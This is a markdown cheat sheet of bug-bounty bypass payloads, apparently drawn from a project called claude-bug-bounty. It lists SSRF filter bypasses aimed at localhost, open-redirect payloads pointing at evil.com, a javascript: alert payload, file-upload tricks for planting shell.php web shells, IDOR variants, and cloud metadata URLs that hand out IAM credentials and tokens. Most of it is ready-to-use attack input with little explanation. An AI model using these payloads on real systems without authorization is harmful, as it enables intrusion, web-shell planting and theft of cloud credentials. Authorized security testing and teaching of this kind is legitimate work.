# Bypass Tables & Payloads (from claude-bug-bounty)

Quick reference for testing. Full payloads in [claude-bug-bounty security-arsenal](https://github.com/shuvonsec/claude-bug-bounty/blob/main/skills/security-arsenal/SKILL.md).

---

## SSRF IP Bypass (11 techniques)

| Technique | Example |
|-----------|---------|
| Decimal IP | `http://2130706433` (127.0.0.1) |
| Octal IP | `http://0177.0.0.1` |
| Hex IP | `http://0x7f.0x0.0x0.0x1` |
| Short IP | `http://127.1` |
| IPv6 | `http://[::1]` |
| IPv6 mapped | `http://[::ffff:127.0.0.1]` |
| DNS rebinding | DNS A→external then internal after allowlist check |
| Redirect chain | External URL → 302 to internal (Vercel pattern) |
| URL parser confusion | `http://attacker.com#@internal` |
| CNAME to internal | Attacker domain → internal hostname |
| Rare format | `http://[::ffff:0x7f000001]` |

---

## Open Redirect Bypass (11 techniques, for OAuth chaining)

| Technique | Example |
|-----------|---------|
| @ symbol | `https://legit.com@evil.com` |
| Subdomain abuse | `https://legit.com.evil.com` |
| Protocol tricks | `javascript:alert(1)` |
| Double encoding | `%252f%252fevil.com` |
| Backslash | `https://legit.com\@evil.com` |
| Protocol-relative | `//evil.com` |
| Null byte | `https://legit.com%00.evil.com` |
| Unicode IDN | `https://legіt.com` (Cyrillic і) |
| Data URL | `data:text/html,<script>...` |
| Fragment abuse | `https://legit.com#@evil.com` |
| Redirect + OAuth | `target.com/callback?redirect_uri=..` |

---

## File Upload Bypass (10 techniques)

| Technique | Example |
|-----------|---------|
| Content-Type | `filename=shell.php`, Content-Type: image/jpeg |
| Extension variants | `.phtml`, `.pHp`, `.php5`, `.phar` |
| Double extension | `shell.php.jpg` |
| Null byte | `shell.php%00.jpg` |
| Magic bytes | Add JPEG header to PHP file |
| Polyglot | Valid image + PHP in same file |
| Path traversal | `../../../shell.php` |
| Case variation | `.pHp`, `.PhP` |
| MIME sniffing | Server trusts wrong content |

---

## IDOR Variants (8)

| Variant | Test |
|---------|------|
| V1 Numeric ID | `/api/user/123` → change to 124 |
| V2 UUID | Enumerate via email invite or other endpoint |
| V3 Indirect | `POST /api/export?report_id=456` exports another's report |
| V4 Parameter add | `?user_id=other` makes backend use it |
| V5 Method swap | PUT protected, DELETE not |
| V6 Old API | `/v1/users/123` lacks auth that `/v2/` has |
| V7 GraphQL node | `{ node(id: "base64(User:456)") { email } }` |
| V8 WebSocket | `{"action":"get_history","userId":"client-UUID"}` |

---

## Sibling Rule (Auth Bypass)

If `/api/admin/users` has auth, check:
- `/api/admin/export`
- `/api/admin/delete`
- `/api/admin/reset`

Often missing middleware on sibling endpoints.

---

## Cloud Metadata Endpoints

```bash
# AWS
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP (Header: Metadata-Flavor: Google)
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure (Header: Metadata: true)
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```
